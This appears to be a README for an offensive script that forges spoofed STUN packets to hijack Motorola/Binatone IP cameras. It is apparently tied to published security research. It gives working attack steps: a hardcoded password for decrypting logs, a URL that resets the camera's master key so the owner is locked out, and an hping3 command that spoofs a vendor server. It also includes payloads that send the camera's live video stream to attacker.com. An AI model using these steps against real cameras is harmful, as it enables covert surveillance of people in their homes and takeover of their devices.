# TL;DR
This script makes special STUN packets to control Motorola/Binatone IP cameras behind NAT

It has been tested with a Motorola FOCUS 73.

# Requirements
* Read the blog at http://www.contextis.com/resources/blog/push-hack-reverse-engineering-ip-camera/
* A valid AES key for your target camera
* hping3 for sending your packet
* Ability to IP spoof (most ISPs don't allow this so either get closer to the target or find a new ISP)
* Wireshark for testing. Should come up as UDP/STUN

# Getting the AES key
There are different ways to get the key:

### Download it
If you can access the device locally, visit :8080/cgi-bin/logdownload.cgi then decrypt the logs with **Cvision123459876**

### Set it
If you want to control it AND stop the owner accessing it... :80/?action=command&command=set_master_key=MyCameraNowThanx

### Read it from the file system
Get a root shell on the camera with a bit of javascript (see blog) then find skyeye.conf. The AES key is in there.

# Execution

`python stunning.py “set_wowza_server&value=10.45.3.100” > stunpacket`

`hping3 10.45.3.62 --udp -V -p 50610 --spoof stun.hubble.in -s 3478 --file stunpacket --data $(stat -c%s stunpacket) -c 1`

Note: The UDP source port will always be 3478 but the destination port is dynamic. If you have access to the camera you can find it with netstat otherwise you will need to try different ports with the following 2 payloads to find the right UDP port.
`set_wowza_server&value=attacker.com`

`start_rtmp`

You will know you've got the right port because you'll receive a live RTMP video stream on TCP 1935. Red5 can be used to receive the video.


